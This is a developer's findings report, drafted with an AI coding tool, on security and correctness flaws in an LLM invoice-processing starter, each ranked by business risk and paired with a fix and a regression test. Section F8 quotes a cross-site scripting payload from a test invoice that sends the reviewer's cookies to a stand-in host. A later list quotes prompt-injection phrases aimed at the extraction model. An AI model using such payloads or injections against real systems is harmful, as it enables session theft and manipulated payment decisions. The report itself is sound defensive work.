# Findings

_Drafted with AI (Claude Code) from my own run of the starter; see `AI_USAGE.md`. Evidence files are in `backend/eval/starter_baseline/`._

How the evidence was produced: the untouched starter (commit `4be14a8`) was run on the 24 dev documents with the same model I use (`gemini-3.5-flash-lite` through the OpenAI-compatible endpoint), on 10 Nov 2026.

- **As delivered:** 0 of 24 documents were processed (`as_delivered.jsonl`). See F3.
- **With one change outside the starter's code** (the harness strips the ``` fence the model puts around its JSON, and retries a provider 503): all 24 processed (`fences_stripped.jsonl`). The routing evidence below comes from this run.
- **Same, with the three leaked examples removed from the prompt:** 18 of 24 processed (`fences_stripped_no_examples.jsonl`).
- **API behaviour:** the starter's API driven with its own fake model (`api_check.py`, output in `api_check_output.txt`).

## The three fixes I would ship first, and why

1. **Code decides the routing, not the model (F1).** This is the only thing standing between a fake bank-change email and a payment. In my run the starter sent 7 of the 13 documents that needed review straight to "ready".
2. **Approvals enforced on the server (F2).** Even a correctly flagged invoice could be paid twice, approved twice by the same person, or approved by another company's user.
3. **No document is ever dropped (F3).** A document that fails must show up in the queue as `processing_error`. In the starter it disappears, and the accuracy number hides it.

The order follows the money: F1 and F2 pay out wrongly, F3 loses invoices without telling anyone. Everything after that is about data leaving the company, wrong numbers reported to management, and weaker forms of the same risks.

## My top eight, ranked by business risk

### F1: The model decides whether a document needs review

- **Severity:** critical
- **Why it ranks here:** Kavya's rule is "I can live with extra reviews. I can't live with a missed one." This is the cause of missed ones, and it is where fraud gets through.
- **Where:** `backend/ledgerline/pipeline.py` `process_document` (reads `requires_review` from the model's JSON); `backend/ledgerline/validation.py` `run_checks` (results stored only as warnings); `backend/ledgerline/extraction.py` (policy text in the prompt).
- **What's wrong:** routing is `needs_review = bool(data.get("requires_review"))`. The checks in code run, but nothing uses their result. Anything in the document that sways the model also sways the routing.
- **Impact:** a document with a changed bank account, a duplicate or a credit note reaches the approval screen marked "ready", with no warning to the reviewer.
- **How I found it:** reading `pipeline.py`, then confirmed by the run below. The AI tool pointed at it first; I verified it against the run output.
- **Evidence from my run:** 13 dev documents need review. The starter routed 7 of them as `ready_for_approval`:

  | Document | Should be flagged for | Total | What the starter produced |
  |---|---|---|---|
  | dev_005 (Vardhan Logistics email) | `bank_details_changed` | ₹1,41,600 | ready. Model's own reason list said `bank_details_changed`, but `requires_review` was false |
  | dev_015 (Sitara) | `duplicate` | ₹34,220 | ready, no reasons |
  | dev_019 (Konkan Tooling email) | `duplicate` | ₹72,275 | ready, no reasons (the code's own warning said `duplicate`) |
  | dev_007 (Konkan credit note) | `credit_note`, 0 approvals | ₹11,446 | ready, 1 approval: a credit note becomes payable |
  | dev_013 (Precision Gauges, script in remarks) | `suspicious_content` | ₹24,426 | ready |
  | dev_008 (Bharat Abrasives) | `totals_mismatch` | ₹46,448 | ready, with the wrong reason (`tax_type_mismatch`) |
  | dev_004 (Precision Gauges) | `tax_type_mismatch` | ₹28,792 | ready |

  In five of the seven the model named a reason and still said no review was needed. It also flagged one clean document (dev_021).
- **What it could cost Meridian:** in this run alone, ₹2,59,541 of payments that the policy says must not go out unchecked were marked ready (dev_005, dev_015, dev_019, dev_007). Meridian has already lost ₹3.8 lakh to one fake bank-change email (Farhan's message). In production about 390 documents a month need review (13% of 3,000). Even if the starter missed a tenth as often as it did here, about 20 a month would reach approval with no warning; one paid duplicate at the dev-set median (about ₹35,600) per month is a low estimate, and one bank-change fraud is ₹1.4 to 3.8 lakh each time.
- **Fix:** `pipeline.py` now routes only on `validation.run_checks`; the model's JSON has no routing field that can clear a review (its one flag, `addressed_to_software`, can only add one). The policy is no longer in the prompt. Not committed yet.
- **Regression test:** `tests/test_pipeline.py::test_the_model_cannot_wave_a_document_through`, `tests/test_policy_on_dev_labels.py::test_policy_checks_agree_with_every_dev_label`
- **Status:** fixed. On the same model my pipeline misses 0 of 13.

### F2: The approve endpoint pays twice and checks nothing

- **Severity:** critical
- **Why it ranks here:** it moves money directly, and it has already happened (Kavya's double payment on a slow Approve). It ranks below F1 only because it needs a person to click.
- **Where:** `backend/ledgerline/api.py` `approve_invoice`, `reject_invoice`, `get_invoice`; `backend/ledgerline/pipeline.py` `HIGH_VALUE_THRESHOLD`.
- **What's wrong:** every approve call inserts an approval row and, once the count is reached, another payment row. It counts rows, not different people. There is no check of the organisation, of the invoice state (duplicate, credit note, rejected), or of the note. Reject has no checks at all. Two approvals are required only above ₹5,00,000 (policy: ₹5,00,000 and above), never for foreign currency, and a credit note needs 1 instead of 0.
- **Impact:** double payments; the two-person rule can be met by one person clicking twice; another tenant can read and approve Meridian's invoices.
- **How I found it:** reading `api.py`, then confirmed with `api_check.py`.
- **Evidence from my run** (`api_check_output.txt`, starter API with its fake model, invoice total ₹23,458):
  - Approve twice by the same user: two payment rows, `(1, 23458.0), (1, 23458.0)`.
  - Header `X-Org-Id: rival`: read returns 200, approve returns 200.
  - Invoice needing 2 approvals: the same user twice gives `approved`.
  - Reject after approval returns `rejected`; reject of invoice 9999 (does not exist) returns 200.
  - A credit note in review is approved with no note and a payment is created.
  - From the model run: dev_017 (exactly ₹5,00,000) and dev_014 (USD) each got 1 required approval instead of 2.
- **What it could cost Meridian:** each repeated click pays the full invoice again (dev-set average about ₹70,800). If one approval in a thousand is repeated by a double-click or a retry, that is about 3 a month, roughly ₹2 lakh a month paid twice and to be recovered. The single-person approval of a ₹5 lakh+ invoice removes the main control on the largest payments.
- **Fix:** `api.py` approve and reject run inside one `BEGIN IMMEDIATE` transaction: organisation check (404 for another org), blocked states (409 for duplicate, credit note, processing error, already rejected), note required for reviewed documents (422), one approval per user, one payment per invoice (unique index in `db.py`), audit log entry for every decision. `validation.required_approvals` follows the policy (≥ ₹5,00,000 or foreign: 2; credit note: 0). Not committed yet.
- **Regression test:** `tests/test_api.py::test_approving_twice_creates_one_payment`, `::test_high_value_invoice_needs_two_different_people`, `::test_another_org_cannot_see_or_decide_an_invoice`, `::test_duplicate_cannot_be_approved_but_can_be_rejected`, `::test_credit_note_cannot_be_approved`, `::test_reviewed_document_needs_a_note_to_approve`, `::test_approved_invoice_cannot_be_rejected`, `::test_decisions_are_written_to_the_audit_log`; `tests/test_validation.py::test_required_approvals`
- **Status:** fixed. Not tested: two approvals arriving at exactly the same moment from two processes (the transaction and the unique index are there for it, but I have no concurrent test).

### F3: Documents that fail are dropped, and the accuracy number hides it

- **Severity:** high
- **Why it ranks here:** a lost invoice is not fraud, but nobody knows it is missing until the vendor chases. It also makes every reported number look better than it is.
- **Where:** `backend/ledgerline/extraction.py` `extract` (`json.loads` on the raw reply, no retry); `backend/ledgerline/cli.py` (`[skip]` and carry on); `backend/eval/run_eval.py` (`continue` on any exception); `backend/ledgerline/parsing.py` `parse_amount`.
- **What's wrong:** any reply that is not bare JSON, any provider error, and any value like `500 kg` or `$50.00` raises an exception. The CLI prints `[skip]` and writes no line; the eval leaves the document out of the denominator.
- **Impact:** invoices vanish from the batch and from the accuracy figure.
- **How I found it:** running the starter.
- **Evidence from my run:**
  - As delivered on my model: **0 of 24 processed.** 18 failed with `JSONDecodeError: Expecting value: line 1 column 1` (the model wraps its JSON in a ``` fence; all 48 replies in the later run were fenced) and 6 with `503 Service Unavailable`.
  - With fences stripped and the leaked examples removed: 6 of 24 failed. dev_003, dev_016, dev_022: `could not convert string to float: '500 kg'` (and `'1200 kg'`, `'750 kg'`); dev_014: `'$50.00'`; dev_001, dev_002: `Error binding parameter 20: type 'list' is not supported`. dev_014 is the foreign-currency invoice that needs two approvals.
  - The starter's eval on that run reports 213/216 = 98.6%. Counting the six failures it is 213/288 = 74.0%.
- **What it could cost Meridian:** at the 25% failure rate above, 750 of 3,000 documents a month would have to be noticed missing and keyed by hand: 750 × ₹85 = ₹63,750 a month, before any late-payment cost (MSME vendors must be paid within 45 days). With a model that fences its JSON, it is every document.
- **Fix:** `extraction.py` accepts fenced JSON and retries one unparseable reply; `pipeline.process_document` never raises: a failed document is stored with `processing_error` and goes to the queue; `cli.py` writes one line per document always; `parsing.py` reads `Rs.`, `/-`, units and refuses to guess; `run_eval.py` counts a failed document as wrong. Not committed yet.
- **Regression test:** `tests/test_pipeline.py::test_unparseable_reply_is_retried_once`, `::test_unreadable_document_is_kept_as_processing_error`, `::test_provider_outage_is_a_processing_error_not_a_crash`, `::test_a_value_that_cannot_be_parsed_is_a_processing_error`, `::test_normalize_tidies_units_hsn_codes_and_spaced_invoice_numbers`; `tests/test_cli.py::test_every_document_gets_a_line_even_when_the_model_fails`
- **Status:** fixed. A provider outage is not retried over time: the document waits in the queue as `processing_error` (see "Found but not fixed").

### F4: Bank account numbers and the whole vendor master are sent to the LLM provider

- **Severity:** high
- **Why it ranks here:** it is a data-protection breach on every single document (Priya: bank account numbers must not leave), but it does not by itself move money.
- **Where:** `backend/ledgerline/extraction.py` `build_extraction_prompt`, `build_verification_prompt`.
- **What's wrong:** each prompt contains the full document, the full `vendors.csv` (every vendor's bank account and IFSC) and the policy, and it is sent twice per document.
- **Impact:** every vendor's bank details go to a third party about 6,000 times a month.
- **How I found it:** reading the prompt builder; the run shows prompts averaging about 16,000 characters.
- **Fix:** `extraction.mask_account_numbers` replaces every 9 to 18 digit run with a placeholder before the call and puts the real value back afterwards in code. The prompt holds only the masked document. E-invoice JSON is parsed in code with no call at all.
- **Regression test:** `tests/test_pipeline.py::test_bank_account_numbers_are_masked_before_the_llm_sees_them`, `::test_prompt_carries_no_vendor_master_policy_or_answers`, `::test_einvoice_json_is_parsed_without_an_llm_call`
- **Status:** fixed for account numbers. Supplier names, GSTINs, amounts and IFSC codes still go to the provider; that is a decision for Priya (see "not sure").

### F5: The cost dashboard is 1000 times too low, and the real cost is four times the budget

- **Severity:** high
- **Why it ranks here:** management was told "well under a rupee" while the bill was $165. Wrong numbers, not lost money, so below F1 to F4.
- **Where:** `backend/ledgerline/llm/pricing.py` `USD_PER_MTOK`, `cost_usd`; `extraction.extract` (second "verification" call); `config.py` (default model `claude-opus-5-5`); `api.py` `stats`.
- **What's wrong:** the table holds per-thousand-token prices under a per-million label (Opus 5.5 as `0.004, 0.020`). A model not in the table costs 0. Every document makes two calls with a prompt of about 6,400 tokens each.
- **Impact:** measured on my run: 12,818 input and 758 output tokens per document. At Opus 5.5 prices ($4 and $20 per million) that is $0.066 = ₹5.85 per document, against a target of ₹1.50. For 2,400 documents it is about $160, which matches Deepak's $165 bill; divided by 1000 it is about ₹14, which matches the dashboard's ₹15. On my model the starter's dashboard showed ₹0.00 (`api_check_output.txt` and the run).
- **How I found it:** reading `pricing.py` against the bill in the stakeholder thread, then checked with measured token counts.
- **Fix:** prices corrected to per-million; an unknown model logs a warning; one call per document with a short prompt, none for e-invoices; stats count every processed document.
- **Regression test:** `tests/test_policy_on_dev_labels.py::test_prices_are_per_million_tokens`, `tests/test_api.py::test_stats_counts_processed_documents`
- **Status:** fixed. Mine: ₹0.094 per document measured (starter on the same model: ₹0.505).

### F6: The "94%" comes from an eval that contains its own answers and does not measure routing

- **Severity:** high
- **Why it ranks here:** the go-live decision rests on this number. It is not a bug that pays anyone, so it sits below the ones that do.
- **Where:** `backend/ledgerline/extraction.py` `_few_shot_examples`; `backend/eval/run_eval.py`.
- **What's wrong:** the prompt's examples are the first three dev documents with their expected answers, and the eval scores those same documents. The eval scores 12 fields only: not `needs_review`, reasons, approvals, bank details or line items. Numbers are compared as floats, failures are skipped.
- **Impact:** a system that misses 7 of 13 reviews scores 99.3% on it. Without their answers in the prompt, all three example documents crash (0 of 36 fields).
- **How I found it:** reading, then the two runs. Details in `EVAL_REPORT.md`.
- **Fix:** no examples from the dev set in the prompt; `run_eval.py` rewritten to score all fields, line items, routing per review code, approvals, cost and latency, with failures counted.
- **Regression test:** `tests/test_pipeline.py::test_prompt_carries_no_vendor_master_policy_or_answers`; the eval itself (`make eval`).
- **Status:** fixed.

### F7: The policy checks in code are wrong

- **Severity:** high once code decides (in the starter they are only warnings, which is why this is not higher)
- **Why it ranks here:** fixing F1 without this would replace an unreliable model with unreliable code.
- **Where:** `backend/ledgerline/validation.py` (all checks), `parsing.py`.
- **What's wrong:**
  - `check_tax_type` compares the text `"27"` with the number 27, so it fires on almost every Maharashtra supplier (15 of 24 documents in my run carry a `tax_type_mismatch` warning).
  - `check_totals` wants exact equality and ignores round-off (5 false warnings in my run); the policy allows ₹1.00.
  - Vendors are matched by name; the policy says GSTIN.
  - `is_valid_gstin` checks only the shape, not the check character.
  - Duplicates are matched on the raw name and number, with no normalisation, financial year or organisation.
  - The bank check compares only the IFSC, case-sensitively.
  - There are no checks at all for new vendors, foreign currency, credit notes or suspicious content.
- **How I found it:** reading against `AP_POLICY.md`, and the warnings in the run output.
- **Fix:** every check rewritten against the policy text. Not committed yet.
- **Regression test:** all of `tests/test_validation.py` (for example `::test_gstin_with_wrong_check_character_rejected`, `::test_totals_within_one_rupee_are_fine`, `::test_duplicate_found_despite_different_punctuation`, `::test_vendor_is_matched_by_gstin_not_by_name`, `::test_vendor_new_uses_the_invoice_date`), and `tests/test_policy_on_dev_labels.py::test_policy_checks_agree_with_every_dev_label` (all 24 labels, no model involved).
- **Status:** fixed.

### F8: Supplier text runs as HTML in the reviewer's browser, and instructions in documents reach the model unguarded

- **Severity:** high
- **Why it ranks here:** an attacker needs only to send an invoice. It is last of the eight because, after F1 and F2, neither the model nor the browser can approve a payment alone.
- **Where:** `frontend/src/App.tsx` (notes rendered with `dangerouslySetInnerHTML`); `extraction.py` (document pasted into the prompt next to the instructions).
- **What's wrong:** dev_013's remarks contain `<img src=x onerror="fetch('https://exfil.example/c?d='+document.cookie)">`. The starter extracts it into `notes` and the UI inserts it as HTML. Separately, a document can address the model directly, and the model's answer decided routing (F1).
- **Impact:** a script runs in an AP reviewer's session, which can click Approve.
- **How I found it:** reading `App.tsx`; dev_013 in the run was routed ready.
- **Fix:** the UI renders all supplier text as plain text; the document is wrapped in `<document>` tags and described as data; `validation.check_suspicious_content` flags markup and text addressed to software, in code.
- **Regression test:** `tests/test_pipeline.py::test_injected_instructions_are_flagged_not_followed`, `tests/test_validation.py::test_suspicious_content`. UI: manual check in the browser (dev_013 uploaded, the tag is shown as text and no request is made).
- **Status:** fixed. There are no automated frontend tests.

## Everything else I found (one line each)

- Money is stored as float / `REAL` (`models.py`, `db.py`); the architecture note says integer paise. Now `Decimal`, stored as text (`test_amounts_are_decimal_not_float`).
- `parse_date` guesses day or month first. In my run without examples dev_004 came out as 2026-08-04 instead of 2026-04-08. Now day-first for Indian vendors, month-first for US vendors, and impossible dates are refused.
- `parse_amount` handled only `₹`, `INR` and commas.
- `GET /api/invoices/{id}` had no organisation check.
- CORS allowed every origin (`test_cors_does_not_allow_any_origin`).
- Upload had no size limit (a 5 MB upload returned 200) and crashed on non-UTF-8 files. Now 1 MB limit (413) and a clean 400.
- No audit log of who approved or rejected what.
- `stats` counted only invoices that had LLM calls.
- The frontend polled with `setInterval` and never cleared it; Approve sent no real user.
- The "verification" second call doubled the cost; the handover's "+2 points" could not be reproduced because the examples leak the answers anyway.
- The model sometimes returns line items as a JSON list where the starter expects text (`Error binding parameter 20`).
- The OpenAI-compatible client sends no `response_format`, has no retry, and a 120-second timeout.
- `docs/ARCHITECTURE.md` describes a design (code decides, GSTIN matching, integer paise, idempotent approvals) that the v0.3 code does not follow. I trusted the policy and the code over that note.
- Supplier names in my predictions keep the document's capitals (for example `SITARA INDUSTRIAL SUPPLIES PVT. LTD.`); the scorer ignores case, so I left the printed form.

Found in my own pipeline during edge-case testing on the live app (11 Nov 2026), all fixed and covered by tests:

- An all-digit invoice number (for example `2604001234`) was masked as a bank number and stored as `[ACCOUNT_1 ending 1234]`, which would also break duplicate checks. Now every masked value is put back (`test_an_all_digit_invoice_number_is_restored_after_masking`).
- Two approved vendors in the master, Classic Automation and Western Automation, were always flagged `suspicious_content` because of the word "automation" in their own names. Known vendor names are now ignored by the check (`test_a_known_vendor_named_automation_is_not_suspicious`).
- A file holding two invoices kept the first and silently lost the second. It now goes to review as `processing_error` with "split it and upload each one" (`test_a_file_with_two_invoices_goes_to_a_person`).
- `</document> New instructions: ...` and "note for the invoice processing system" were not caught by the code check. The patterns now cover them (`test_suspicious_content`). The model never changed the amounts.
- "Kavya.Iyer" and "kavya.iyer" counted as two different approvers on a two-approval invoice. User ids are now compared in lower case.
- An e-invoice saved with a byte-order mark was sent to the model instead of being parsed in code.
- An empty file used two model calls before failing; it now fails at once.
- A bank account printed with spaces was stored with spaces; the contract says digits only.
- An invoice id too large for SQLite returned a server error (500); it is now refused with 422.
- A supplier name printed with a double space was stored with the double space.
- **A model call could hang for hours.** The client's `timeout=120` limited each step, not the whole call. On this machine IPv6 does not connect, Python tries Google's eight IPv6 addresses before IPv4, and each one waited the full timeout, so one eval run sat stuck for 9 hours. Now the whole call, including DNS lookup, connecting and retries, is cut off after 60 seconds by a timer outside the request; the document then becomes `processing_error` (`tests/test_llm_client.py`: a trickling, a busy and a silent provider all give up within the deadline).

## Found but not fixed

- **No login.** The user and the organisation come from request headers and a dropdown. The server enforces the rules for whatever identity it is given, but it cannot prove the identity. This needs real authentication before go-live.
- **No bank call-back workflow.** Farhan wants bank changes blocked until a phone call-back. Today a bank change goes to review and needs a note; there is no call-back record and no phone field (Sunil's point).
- **No retry or second provider.** During an outage documents are stored as `processing_error` and wait; nothing re-runs them automatically.
- **No purchase-order or goods-receipt matching.** Amounts are only checked against themselves.
- **Per-field source highlighting (Part 4 A) is not built.** The reviewer sees the original document next to the fields, but not the exact characters each field came from.
- **Uploads are processed inside the request.** At the month-end peak (about 400 a day) this should be a queue.
- **SQLite and no migrations.** Fine for the pilot, and Deepak asked for no new infrastructure.
- **A model call can take up to 60 seconds** before it is cut off. A document that hits that limit becomes `processing_error` and waits for a person; it is not re-run automatically. On the evening of 11 Nov, when Gemini's free tier was slow, this happened to 2 of 24 documents in one run.
- **A debit note sent as an e-invoice is treated as an ordinary invoice** and can be paid after one approval. The policy does not mention debit notes.
- **A broken e-invoice JSON file is sent to the model** instead of being refused in code. It ends as `processing_error`, but costs two calls.

## Things I'm not sure are problems at all

- **An invoice dated a year in the future** goes to "ready" under the policy as written (tested live). See disp_06 and the proposed policy change.
- **A rejected invoice still counts for the duplicate check.** If a supplier re-sends a corrected invoice under the same number, it is flagged duplicate and can only be rejected. That is what the policy says, but it may block a genuine correction (compare disp_02).

- **Masking any 9 to 18 digit run.** It also hides long invoice or phone numbers from the model. On the dev set nothing was lost, but I have 24 documents.
- **GSTINs and supplier names still go to the provider.** A GSTIN is public information, but Priya may see it differently.
- **Harmless notes "to your AP system" go to review** (disputed disp_04). The policy says so; reviewers may learn to ignore the flag.
- **The dev labels follow the policy literally.** An invoice with a line that does not multiply out (disp_05) is "ready" under the written policy. That may be a policy gap, not a pipeline problem.
